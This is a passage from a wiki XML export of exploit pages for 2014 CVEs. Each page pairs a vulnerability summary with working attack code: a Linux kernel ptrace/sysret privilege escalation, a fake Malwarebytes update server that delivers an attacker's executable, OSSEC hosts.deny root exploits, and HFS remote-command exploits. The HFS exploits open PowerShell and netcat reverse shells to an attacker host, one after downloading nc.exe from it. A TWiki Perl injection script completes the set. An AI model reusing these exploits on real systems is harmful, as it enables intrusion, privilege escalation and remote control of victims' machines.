The Linux kernel before 3.15.4 on Intel processors does not properly restrict use of a non-canonical value for the saved RIP address in the case of a system call that does not use IRET, which allows local users to leverage a race condition and gain privileges, or cause a denial of service (double fault), via a crafted application that makes ptrace and fork system calls.

==POC==
&lt;pre&gt;
/**
 * CVE-2014-4699 ptrace/sysret PoC
 * by Vitaly Nikolenko
 * vnik5287@gmail.com
 *
 * &gt; gcc -O2 poc_v0.c
 *
 * This code is kernel specific. On Ubuntu 12.04.0 LTS (3.2.0-23-generic), the
 * following will trigger the #GP in sysret and overwrite the #PF handler so we
 * can land to our NOP sled mapped at 0x80000000.
 * However, once landed, the IDT will be trashed. We can either attempt to
 * restore it (then escalate privileges and execute our shellcode) or find
 * something else to overwrite that would transfer exec flow to our controlled
 * user-space address. Since 3.10.something, IDT is read-only anyway. If you
 * have any ideas, let me know.
 */
 
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;
#include &lt;sys/ptrace.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;sys/syscall.h&gt;
#include &lt;sys/user.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;errno.h&gt;

#define SIZE  0x10000000

typedef int __attribute__((regparm(3))) (*commit_creds_fn)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred_fn)(unsigned long cred);

unsigned long __user_cs;
unsigned long __user_ss;
unsigned long __user_rflags;

void __attribute__((regparm(3))) payload() {
	uint32_t *fixptr = (void*)0xffffffff81dd70e8;
	// restore the #PF handler
	*fixptr = -1;
	//commit_creds_fn commit_creds = (commit_creds_fn)0xffffffff81091630;
	//prepare_kernel_cred_fn prepare_kernel_cred = (prepare_kernel_cred_fn)0xffffffff810918e0;
	//commit_creds(prepare_kernel_cred((uint64_t)NULL));

	//__asm__ volatile ("swapgs\n\t"
	//		  "...");
}

int main() {
	struct user_regs_struct regs;
	uint8_t *trampoline, *tmp;
	int status;

	struct {
		uint16_t limit;
		uint64_t addr;
	} __attribute__((packed)) idt;

        // MAP_POPULATE so we don't trigger extra #PF
	trampoline = mmap(0x80000000, SIZE, 7|PROT_EXEC|PROT_READ|PROT_WRITE, 0x32|MAP_FIXED|MAP_POPULATE|MAP_GROWSDOWN, 0,0);
	assert(trampoline == 0x80000000);
	memset(trampoline, 0x90, SIZE); 
        tmp = trampoline;
        tmp += SIZE-1024;
        memcpy(tmp, &amp;payload, 1024);
	memcpy(tmp-13,"\x0f\x01\xf8\xe8\5\0\0\0\x0f\x01\xf8\x48\xcf", 13);

	pid_t chld;

        if ((chld = fork()) &lt; 0) {
		perror("fork");
		exit(1);
	}
	
	if (chld == 0) { 
		if (ptrace(PTRACE_TRACEME, 0, 0, 0) != 0) {
			perror("PTRACE_TRACEME");
			exit(1);
		}
		raise(SIGSTOP);
		fork();
		return 0;
	}

	asm volatile("sidt %0" : "=m" (idt));
	printf("IDT addr = 0x%lx\n", idt.addr);

	waitpid(chld, &amp;status, 0);

	ptrace(PTRACE_SETOPTIONS, chld, 0, PTRACE_O_TRACEFORK); 

	ptrace(PTRACE_CONT, chld, 0, 0);

	waitpid(chld, &amp;status, 0); 

        ptrace(PTRACE_GETREGS, chld, NULL, &amp;regs);
	regs.rdi = 0x0000000000000000;
	regs.rip = 0x8fffffffffffffff;
	regs.rsp = idt.addr + 14*16 + 8 + 0xb0 - 0x78;

	// attempt to restore the IDT
	regs.rdi = 0x0000000000000000;
	regs.rsi = 0x81658e000010cbd0;
	regs.rdx = 0x00000000ffffffff;
	regs.rcx = 0x81658e000010cba0;
	regs.rax = 0x00000000ffffffff;
	regs.r8  = 0x81658e010010cb00;
	regs.r9  = 0x00000000ffffffff;
	regs.r10 = 0x81668e0000106b10;
	regs.r11 = 0x00000000ffffffff;
	regs.rbx = 0x81668e0000106ac0;
	regs.rbp = 0x00000000ffffffff;
	regs.r12 = 0x81668e0000106ac0;
	regs.r13 = 0x00000000ffffffff;
	regs.r14 = 0x81668e0200106a90;
	regs.r15 = 0x00000000ffffffff;

        ptrace(PTRACE_SETREGS, chld, NULL, &amp;regs);

	ptrace(PTRACE_CONT, chld, 0, 0);

	ptrace(PTRACE_DETACH, chld, 0, 0);
}

&lt;/pre&gt;</text>
      <sha1>7ub7s3hid6xw8s2h22zd359pgbwpxlk</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-4936 Malwarebytes Anti-Malware 任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>841</id>
    <revision>
      <id>1100</id>
      <timestamp>2021-04-07T08:05:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== The upgrade functionality in Malwarebytes Anti-Malware (MBAM) consumer before 2.0.3 and Malwarebytes Anti-Exploit (MBAE) consumer 1.04.1.1012 and earlier allow man-in..."</comment>
      <origin>1100</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="9207" sha1="1sewxezsmynl7mkqz3y9ferusyvq8x9" xml:space="preserve">==INFO==
The upgrade functionality in Malwarebytes Anti-Malware (MBAM) consumer before 2.0.3 and Malwarebytes Anti-Exploit (MBAE) consumer 1.04.1.1012 and earlier allow man-in-the-middle attackers to execute arbitrary code by spoofing the update server and uploading an executable.

==POC==
&lt;pre&gt;
#!/usr/bin/env python

"""

 Created by Yonathan Klijnsma
    http://blog.0x3a.com/
    http://twitter.com/ydklijnsma
    
 Malwarebytes Anti-Malware and Anti-Exploit upgrade hijacking vulnerability
 Note: Only the consumer versions of these products are affected, the business
       versions of these products are not affected as they do not check for
       upgrades against the Malwarebytes CDN.

 Assigned CVE: CVE-2014-4936
 Official CVE Description:
    Malwarebytes Anti-Malware in consumer version 2.0.2 and earlier and
    Malwarebytes Anti-Exploit in consumer version 1.03 and earlier allow
    attackers to execute arbitrary code due to program upgrade hijacking.
    Corporate versions are not affected.

 Malwarebytes Anti-Malware:
	- Vulnerability discovered: June 18th 2014
	- Vulnerability reported: July 16th 2014
	- Vulnerability fixed in version 2.0.3 released on October 3rd 2014
 Malwarebytes Anti-Exploit:
	- Vulnerablity discovered: August 19th 2014
	- Vulnerability reported: August 21st 2014
	- Vulnerability fixed in version 1.04.1.1012 released on September 5th 2014
   
 This update server works for both products. Redirect DNS towards this
 host for 'data-cdn.mbamupdates.com' and any subdomains of this. Put a
 payload in the same dir as this script and call it 'payload.exe'. This
 payload will be send to the clients when they ask for updates.
 
"""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime, timedelta
from md5 import md5
import urlparse
import base64
import sys
import re

PORT_NUMBER = 80
UA_PROG_VER_REGEXP = re.compile('base:(\d+\.\d+\.\d+\.\d+)')
MBAM_VERSION_DOWNLOAD_PATH = ''
MBAE_VERSION_DOWNLOAD_PATH = ''
MBAE_FORCE_UPDATE_VERSION = '9.99.9.9999'
PAYLOAD_PATH = './payload.exe'

class mbamCDNHandler(BaseHTTPRequestHandler):

    def mbae_program_check(self):
        global MBAE_VERSION_DOWNLOAD_PATH
        global MBAE_FORCE_UPDATE_VERSION
        
        # Set the version download path so we reconize the URI when the client comes back
        MBAE_VERSION_DOWNLOAD_PATH = '/v2/mbae/consumer/data/mbae-setup-' + MBAE_FORCE_UPDATE_VERSION + '.exe'
        
        date = datetime.now()
        date_exp = date + timedelta(hours=1)

        self.send_response(200)
        # Not all headers are needed but we'll do it anyway.
        self.send_header('Accept-Ranges', 'bytes')
        self.send_header('Cache-Control', 'max-age=300')
        self.send_header('Content-Type', 'application/octet-stream')
        self.send_header('Date', date.strftime('%a, %d %b %Y %H:%M:%S %Z'))
        self.send_header('Etag', '"0-0000000000000"')
        self.send_header('Expires', date_exp.strftime('%a, %d %b %Y %H:%M:%S %Z'))
        self.send_header('Last-Modified', date.strftime('%a, %d %b %Y %H:%M:%S %Z'))
        self.send_header('Server', 'ECAcc (ams/48C9)')
        self.send_header('Content-Length', str(len(MBAE_FORCE_UPDATE_VERSION)))
        self.send_header('Connection', 'close')
        self.end_headers()

        self.wfile.write(MBAE_FORCE_UPDATE_VERSION)

        print '[+] MBAE Client program version check, enforced update to version {}'.format(MBAE_FORCE_UPDATE_VERSION)        
    
    def mbae_program_update(self):
        global PAYLOAD_PATH
        payload_data = open(PAYLOAD_PATH, 'rb').read()

        date = datetime.now()
        date_exp = date + timedelta(hours=1)

        self.send_response(200)
        # Not all headers are needed but we'll do it anyway.
        self.send_header('Accept-Ranges', 'bytes')
        self.send_header('Cache-Control', 'max-age=300')
        self.send_header('Content-Type', 'application/x-msdos-program')
        self.send_header('Date', date.strftime('%a, %d %b %Y %H:%M:%S %Z'))
        self.send_header('Etag', '"000000-00000000000000"')
        self.send_header('Expires', date_exp.strftime('%a, %d %b %Y %H:%M:%S %Z'))
        self.send_header('Last-Modified', date.strftime('%a, %d %b %Y %H:%M:%S %Z'))
        self.send_header('Server', 'ECAcc (dfw/2794)')
        self.send_header('X-Cache', 'HIT')
        self.send_header('Content-Length', str(len(payload_data)))
        self.end_headers()

        # Payload data goes into the response plain
        self.wfile.write(payload_data)

        print '[+] MBAE Client payload download.'

    def mbam_program_check(self):
        global MBAM_VERSION_DOWNLOAD_PATH

        # Get a version number higher than the current (to force the client to download an update)
        ua = self.headers['User-Agent']
        m = re.search(UA_PROG_VER_REGEXP, ua)
        if(m == None):
            self.send_response(500)
            return

        # Set the version download path so we recognize the URI when the client comes back
        version_response = m.group(0)[5:]
        version_response = str(int(version_response[0]) + 1) + version_response[1:]
        MBAM_VERSION_DOWNLOAD_PATH = '/v0/program/data/mbam-setup-' + version_response + '.exe'

        # We need to put a hash in the response headers
        vhash = md5()
        vhash.update(version_response)

        date = datetime.now()
        date_exp = date + timedelta(hours=1)

        self.send_response(200)
        # Not all headers are needed but we'll do it anyway, important one is the MD5
        self.send_header('Accept-Ranges', 'bytes')
        self.send_header('Cache-Control', 'max-age=300')
        self.send_header('Content-MD5', base64.b64encode(vhash.hexdigest()))
        self.send_header('Date', date.strftime('%a, %d %b %Y %H:%M:%S %Z'))
        self.send_header('Etag', '"0-0000000000000"')
        self.send_header('Expires', date_exp.strftime('%a, %d %b %Y %H:%M:%S %Z'))
        self.send_header('Last-Modified', date.strftime('%a, %d %b %Y %H:%M:%S %Z'))
        self.send_header('Server', 'ECAcc (ams/4890)')
        self.send_header('x-admin', 'tedivm was here.')
        self.send_header('X-Cache', 'HIT')
        self.send_header('x-shameless-plug', 'Looking for a dev job? Send your resume to jobs@malwarebytes.org')
        self.send_header('Content-Length', str(len(version_response)))
        self.send_header('Connection', 'close')
        self.end_headers()

        self.wfile.write(version_response)

        print '[+] MBAM Client program version check: Client version {}, enforced update version {}'.format(m.group(0)[5:], version_response)

    def mbam_program_update(self):
        global PAYLOAD_PATH
        payload_data = open(PAYLOAD_PATH, 'rb').read()

        vhash = md5()
        vhash.update(payload_data)

        date = datetime.now()
        date_exp = date + timedelta(hours=1)

        self.send_response(200)
        # Not all headers are needed but we'll do it anyway, important one is the MD5
        self.send_header('Accept-Ranges', 'bytes')
        self.send_header('Cache-Control', 'max-age=300')
        self.send_header('Content-MD5', base64.b64encode(vhash.hexdigest()))
        self.send_header('Content-Type', 'application/x-msdos-program')
        self.send_header('Date', date.strftime('%a, %d %b %Y %H:%M:%S %Z'))
        self.send_header('Etag', '"000000-00000000000000"')
        self.send_header('Expires', date_exp.strftime('%a, %d %b %Y %H:%M:%S %Z'))
        self.send_header('Last-Modified', date.strftime('%a, %d %b %Y %H:%M:%S %Z'))
        self.send_header('Server', 'ECAcc (dfw/27A5)')
        self.send_header('x-admin', 'tedivm was here.')
        self.send_header('X-Cache', 'HIT')
        self.send_header('x-shameless-plug', 'Looking for a dev job? Send your resume to jobs@malwarebytes.org')
        self.send_header('Content-Length', str(len(payload_data)))
        self.send_header('Connection', 'close')
        self.end_headers()

        # Payload data goes into the response plain
        self.wfile.write(payload_data)

        print '[+] MBAM Client payload download.'
        
    def do_GET(self):
        if self.path == "/v0/program/mbam.check.program": # MBAM update check
            self.mbam_program_check()
        elif self.path =="/v2/mbae/consumer/version.chk": # MBAE update check
            self.mbae_program_check()
        elif self.path == MBAM_VERSION_DOWNLOAD_PATH: # MBAM update retrieval
            self.mbam_program_update()
	elif self.path == MBAE_VERSION_DOWNLOAD_PATH: # MBAE update retrieval
	    self.mbae_program_update()
        else: # Any other requests we just reply 200 OK, it doesn't matter for the client if the actual reply is empty.
            print '[+] Attempt for URI: {}'.format(self.path)
            self.send_response(200)

def main():
    try:
            server = HTTPServer(('', PORT_NUMBER), mbamCDNHandler)
            print 'Started Malwarebytes CDN simulator.'
            server.serve_forever()
     
    except KeyboardInterrupt:
            print '^C received, shutting down the web server'
            server.socket.close()

if __name__ == "__main__":
    sys.exit(main())

&lt;/pre&gt;</text>
      <sha1>1sewxezsmynl7mkqz3y9ferusyvq8x9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-5284 OSSEC before 2.8.1權限提升漏洞</title>
    <ns>0</ns>
    <id>842</id>
    <revision>
      <id>1101</id>
      <timestamp>2021-04-07T08:07:35Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== host-deny.sh in OSSEC before 2.8.1 writes to temporary files with predictable filenames without verifying ownership, which allows local users to modify access restric..."</comment>
      <origin>1101</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5720" sha1="0ohu0zg2pn0nfs5ue2t0u0fmefsz5f2" xml:space="preserve">==INFO==
host-deny.sh in OSSEC before 2.8.1 writes to temporary files with predictable filenames without verifying ownership, which allows local users to modify access restrictions in hosts.deny and gain root privileges by creating the temporary files before automatic IP blocking is performed.

==CVE-2014-5284.sh==
&lt;pre&gt;
#!/bin/bash

### CVE-2014-5284
### Exploit Title: ossec 2.8 Insecure Temporary File Creation Vulnerability Privilege Escalation
### Python is nice but doesn't work all the time
### Exploit Author: mbadanoiu

# Python Exploit Author: skynet-13
# Vendor Homepage: www.ossec.net/
# Software Link: https://github.com/ossec/ossec-hids/archive/2.8.1.tar.gz
# Version: OSSEC  - 2.8

# Created from Research by
# Jeff Petersen
# Roka Security LLC
# jpetersen@rokasecurity.com
# Original info at https://github.com/ossec/ossec-hids/releases/tag/2.8.1

function create_files {
	echo "=============================================="
	echo "Creating /tmp/hosts.deny.300 through /tmp/hosts.deny.65536 ..."

	for i in $range; do
		echo -n &gt; /tmp/hosts.deny.$i
	done
}

function watch_files {
	echo "=============================================="
        echo "Monitoring tmp for file change...."
        echo "ssh into the system a few times with an incorrect password"
        echo "Then wait for up to 10 mins"
        echo "=============================================="

	####insert non-empty logic here
	"$inotifywait" -e close_write /tmp/ --include "hosts.deny." |
	while read -r dir events file; do
		on_file_change "$dir$file"
		break
	done
}

function on_file_change {
	local file="$1"
	echo "File: $file has just been modified"
	write_exploit_to_file "$file"
}

function write_exploit_to_file {
	local file="$1"
	echo " sshd : ALL : twist $cmd " &gt; "$file"	###Don't waste time with printing

	echo 'Writing exploit to this file'
	echo "=============================================="
        echo " ssh in again to execute the command"
        echo "=============================================="
        echo "               End Prog."
	exit
}

function verify_inotifywait {
	if [ ! -f "$inotifywait" ]; then
		inotifywait=$(which inotifywait)
		if [ ! "$inotifywait" ]; then
			echo -e "\nNo inotifywait found on the target!"
			echo "Configure and make inotify-tools then run this script again:"
			echo -e "\tcd inotify-tools &amp;&amp; ./autogen.sh &amp;&amp; ./configure &amp;&amp; make\n"
			exit
		fi
	fi
}

#####MAIN######
cmd="$1"

if [ -z "$cmd" ]; then
	echo "Usage of program:"
	echo -e "\tbash $0 &lt;Command_to_run_as_root_in_quotes&gt;"
	exit
fi

range=$(seq 300 65535)

SCRIPT=$(realpath "$0")
SCRIPTPATH=$(dirname "$SCRIPT")
inotifywait="$SCRIPTPATH/inotify-tools/src/inotifywait"

verify_inotifywait

create_files
watch_files

&lt;/pre&gt;

==ossec_host_deny.py==
&lt;pre&gt;
#!/usr/bin/python
# Exploit Title: ossec 2.8 Insecure Temporary File Creation Vulnerability Privilege Escalation
# Date: 14-11-14
# Exploit Author: skynet-13
# Exploit Modifier: mbadanoiu
# Vendor Homepage: www.ossec.net/
# Software Link: https://github.com/ossec/ossec-hids/archive/2.8.1.tar.gz
# Version: OSSEC  - 2.8
# Tested on: Ubunutu x86_64
# CVE : 2014-5284

# Created from Research by
# Jeff Petersen
# Roka Security LLC
# jpetersen@rokasecurity.com
# Original info at https://github.com/ossec/ossec-hids/releases/tag/2.8.1

# Run this on target machine and follow instructions to execute command as root

from twisted.internet import inotify
from twisted.python import filepath
from twisted.internet import reactor
import os
import optparse
import signal


class HostDenyExploiter(object):

    def __init__(self, path_to_watch, cmd):
        self.path = path_to_watch
        self.notifier = inotify.INotify()
        self.exploit = cmd

    def create_files(self):
        print "=============================================="
        print "Creating /tmp/hosts.deny.300 through /tmp/hosts.deny.65536 ..."

        for i in range(300, 65536):
            filename = "/tmp/hosts.deny.%s" % i
            f = open(filename, 'w')
            f.write("")
            f.close()

    def watch_files(self):
        print "=============================================="
        print "Monitoring tmp for file change...."
        print "ssh into the system a few times with an incorrect password"
        print "Then wait for up to 10 mins"
        print "=============================================="
        self.notifier.startReading()
        self.notifier.watch(filepath.FilePath(self.path), callbacks=[self.on_file_change])

    def write_exploit_to_file(self, path):
        print 'Writing exploit to this file'
        f = open(str(path).split("'")[1], 'w')
        f.write(' sshd : ALL : twist %s \n' % self.exploit)
        f.close()
        print "=============================================="
        print " ssh in again to execute the command"
        print "=============================================="
        print "               End Prog."
        os.kill(os.getpid(), signal.SIGUSR1)

    def on_file_change(self, watch, path, mask):
	file=str(path).split("'")[1]
        print 'File: ', file, ' has just been modified'
	if 'hosts.deny' in file:
	        self.notifier.stopReading()
        	self.write_exploit_to_file(path)


if __name__ == '__main__':
    parser = optparse.OptionParser("usage of program \n" + "-c Command to run as root in quotes\n")
    parser.add_option('-c', dest='cmd', type='string', help='Used to specify a command to run as root')
    (options, args) = parser.parse_args()
    cmd = options.cmd
    if options.cmd is None:
        print parser.usage
        exit(0)
    ex = HostDenyExploiter('/tmp', cmd)
    ex.create_files()
    ex.watch_files()
    reactor.run()
    exit(0)

&lt;/pre&gt;</text>
      <sha1>0ohu0zg2pn0nfs5ue2t0u0fmefsz5f2</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-6271 GNU Bash through 4.3 任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>843</id>
    <revision>
      <id>1102</id>
      <timestamp>2021-04-07T08:10:14Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary..."</comment>
      <origin>1102</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="754" sha1="5w4wt15guahovximsijqq85gib0chs9" xml:space="preserve">==INFO==
GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege boundary from Bash execution, aka "ShellShock." NOTE: the original fix for this issue was incorrect; CVE-2014-7169 has been assigned to cover the vulnerability that is still present after the incorrect fix.

==EXP==
https://github.com/JustYoomoon/Exploit/blob/main/cve-2014-6271.zip</text>
      <sha1>5w4wt15guahovximsijqq85gib0chs9</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-6287 HFS (HTTP File Server) 2.3.x遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>224</id>
    <revision>
      <id>340</id>
      <timestamp>2021-03-12T08:05:06Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3) # Google Dork: intext:"httpfileserver 2.3" # Date: 20/02/2021 # Exploit Author: Perg..."</comment>
      <origin>340</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2131" sha1="n76z4wp9p0s0yyeybi8sf8a82u2qnbt" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
# Google Dork: intext:"httpfileserver 2.3"
# Date: 20/02/2021
# Exploit Author: Pergyz
# Vendor Homepage: http://www.rejetto.com/hfs/
# Software Link: https://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Microsoft Windows Server 2012 R2 Standard
# CVE : CVE-2014-6287
# Reference: https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands

#!/usr/bin/python3

import base64
import os
import urllib.request
import urllib.parse

lhost = "10.10.10.1"
lport = 1111
rhost = "10.10.10.8"
rport = 80

# Define the command to be written to a file
command = f'$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport}); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "&gt; "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()'

# Encode the command in base64 format
encoded_command = base64.b64encode(command.encode("utf-16le")).decode()
print("\nEncoded the command in base64 format...")

# Define the payload to be included in the URL
payload = f'exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand {encoded_command}'

# Encode the payload and send a HTTP GET request
encoded_payload = urllib.parse.quote_plus(payload)
url = f'http://{rhost}:{rport}/?search=%00{{.{encoded_payload}.}}'
urllib.request.urlopen(url)
print("\nEncoded the payload and sent a HTTP GET request to the target...")

# Print some information
print("\nPrinting some information for debugging...")
print("lhost: ", lhost)
print("lport: ", lport)
print("rhost: ", rhost)
print("rport: ", rport)
print("payload: ", payload)

# Listen for connections
print("\nListening for connection...")
os.system(f'nc -nlvp {lport}')
&lt;/pre&gt;</text>
      <sha1>n76z4wp9p0s0yyeybi8sf8a82u2qnbt</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-6287 Rejetto HTTP File Server 任意程序執行漏洞</title>
    <ns>0</ns>
    <id>844</id>
    <revision>
      <id>1103</id>
      <timestamp>2021-04-07T08:11:43Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server (aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to execute arbitrary pr..."</comment>
      <origin>1103</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3079" sha1="lmfbb7et10dq67mbdjeden6k35d7iv0" xml:space="preserve">==INFO==
The findMacroMarker function in parserLib.pas in Rejetto HTTP File Server (aks HFS or HttpFileServer) 2.3x before 2.3c allows remote attackers to execute arbitrary programs via a %00 sequence in a search action.


==EXP==
&lt;pre&gt;

# Exploit Title: HttpFileServer 2.3.x Remote Command Execution
# Google Dork: intext:"httpfileserver 2.3"
# Date: 04-01-2016
# Remote: Yes
# Exploit Author: Avinash Kumar Thapa aka "-Acid"
# Vendor Homepage: http://rejetto.com/
# Software Link: http://sourceforge.net/projects/hfs/
# Version: 2.3.x
# Tested on: Windows Server 2008 , Windows 8, Windows 7
# CVE : CVE-2014-6287
# Description: You can use HFS (HTTP File Server) to send and receive files.
#     It's different from classic file sharing because it uses web technology to be more
#     compatible with today's Internet. It also differs from classic web servers because
#     it's very easy to use and runs "right out-of-the box". Access your remote files, over
#     the network. It has been successfully tested with Wine under Linux.

# Usage is: python %s &lt;Target IP address&gt; &lt;Target Port Number&gt; &lt;Local ip where http server listen&gt; &lt;local port for the reverse shell&gt;
# EDB Note: You need to be using a web server hosting netcat (http://&lt;attackers_ip&gt;:80/nc.exe).
# You may need to run it multiple times for success!

import urllib2 as url
import sys

if len(sys.argv) == 5:
  rhost = sys.argv[1]
  rport = sys.argv[2]
  lhost = sys.argv[3]  # local IP address
  lport = sys.argv[4]  # Local Port number
else:
  print "[-] Something went wrong..!"
  print "[-] Usage is: python %s &lt;Target IP address&gt; &lt;Target Port Number&gt; &lt;Local ip where http server listen&gt; &lt;local port for the reverse shell&gt;" % sys.argv[0]
  print "[-] Don't forget to have an http server with will serve the nc.exe file like http://local_ip:80/nc.exe"
  sys.exit(-1)
vbscript="C:\Users\Public\script.vbs"
ncdownurl="http://"+lhost+"/nc.exe"
ncpathsave="C:\\Users\\Public\\nc.exe"
exe1 = "exec|" + "cscript.exe "+vbscript
exe2 = "exec|" + ncpathsave+" -e cmd.exe " +lhost + " " + lport

save='''save|'''+vbscript+'''|dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "'''+ncdownurl+'''", False
xHttp.Send

with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "'''+ncpathsave+'''", 2 '//overwrite
end with
'''

try:
  # create vbs wget nc.exe
  url.urlopen("http://" + rhost + ":" + rport + "/?search=%00{.+" + url.quote(save) + ".}")

  #execute_script
  url.urlopen("http://" + rhost + ":" + rport + "/?search=%00{.+" + url.quote(exe1) + ".}")

  #nc_run():
  url.urlopen("http://" + rhost + ":" + rport + "/?search=%00{.+" + url.quote(exe2) + ".}")
except:
  print "[-] Something went wrong..!"
  print "[-] Usage is: python %s &lt;Target IP address&gt; &lt;Target Port Number&gt; &lt;Local ip where http server listen&gt; &lt;local port for the reverse shell&gt;" % sys.argv[0]
  print "[-] Don't forget to have an http server with will serve the nc.exe file like http://local_ip:80/nc.exe"
  sys.exit(-1)


&lt;/pre&gt;</text>
      <sha1>lmfbb7et10dq67mbdjeden6k35d7iv0</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-7236 TWiki before 6.0.1任意perl代碼執行漏洞</title>
    <ns>0</ns>
    <id>845</id>
    <revision>
      <id>1104</id>
      <timestamp>2021-04-07T08:13:57Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== Eval injection vulnerability in lib/TWiki/Plugins.pm in TWiki before 6.0.1 allows remote attackers to execute arbitrary Perl code via the debugenableplugins parameter..."</comment>
      <origin>1104</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1325" sha1="439nbra6vg0oclmaezl6ibdrdlu682g" xml:space="preserve">==INFO==
Eval injection vulnerability in lib/TWiki/Plugins.pm in TWiki before 6.0.1 allows remote attackers to execute arbitrary Perl code via the debugenableplugins parameter to do/view/Main/WebHome.

==Usage==
&lt;pre&gt;
perl exploit.pl host [cmd]

ex. perl exploit.pl http://127.0.0.1/Main/WebHome "uname -a"
&lt;/pre&gt;

==EXP==
&lt;pre&gt;
#!/usr/bin/perl
=cut
TWiki code execution CVE-2014-7236
m0nad &lt;m0nad/at/email.com&gt;
ref: http://seclists.org/fulldisclosure/2014/Oct/44
=cut
use LWP::Simple;
use strict;
use diagnostics;
use warnings;
sub banner
{
	print "[*] TWiki code execution CVE-2014-7236\n";
	print "[*] m0nad &lt;m0nad/at/email.com&gt;\n";
}
sub usage
{
	print "[?] usage: perl $0 &lt;host&gt; [cmd]\n";
	print "[?] ex. perl $0 http://127.0.0.1/Main/WebHome \"uname -a\"\n";
	exit;
}
sub exploit
{
	my ($host, $cmd) = @_;
	$cmd = "echo start_xpl &amp;&amp;" . $cmd . "&amp;&amp; echo end_xpl";
	my $byte =  join('.', map { 'chr('.$_.')' } unpack('C*', $cmd));
	my $payload = "?debugenableplugins=BackupRestorePlugin%3bprint%28%22Content-Type:text/html\\r\\n\\r\\n%22%29%3bprint(system($byte))%3b%3bexit";

	my $res = get $host . $payload;
	print "[-] Exploit Failed\n" and exit unless ($res =~ m/start_xpl\n(.*?)end_xpl/ms);
	print "[+] $1";
}
banner();
my $host = shift || usage();
my $cmd = shift || "echo Vulnerable!";
exploit($host, $cmd);

&lt;/pre&gt;</text>
      <sha1>439nbra6vg0oclmaezl6ibdrdlu682g</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2014-7911 Android before 5.0.0 任意代碼執行漏洞</title>
    <ns>0</ns>
    <id>846</id>
    <revision>
      <id>1105</id>
      <timestamp>2021-04-07T08:15:37Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==INFO== luni/src/main/java/java/io/ObjectInputStream.java in the java.io.ObjectInputStream implementation in Android before 5.0.0 does not verify that deserialization will re..."</comment>
      <origin>1105</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="563" sha1="jz978w50hwiq9i6nm04esxzqbk44pct" xml:space="preserve">==INFO==
luni/src/main/java/java/io/ObjectInputStream.java in the java.io.ObjectInputStream implementation in Android before 5.0.0 does not verify that deserialization will result in an object that met the requirements for serialization, which allows attackers to execute arbitrary code via a crafted finalize method for a serialized object in an ArrayMap Parcel within an intent sent to system_service, as demonstrated by the finalize method of android.os.BinderProxy, aka Bug 15874291.

==POC==
https://github.com/JustYoomoon/Exploit/blob/main/CVE-2014-7911.zip</text>
      <sha1>jz978w50hwiq9i6nm04esxzqbk44pct</sha1>
    </revision>
  </page>
  <page>
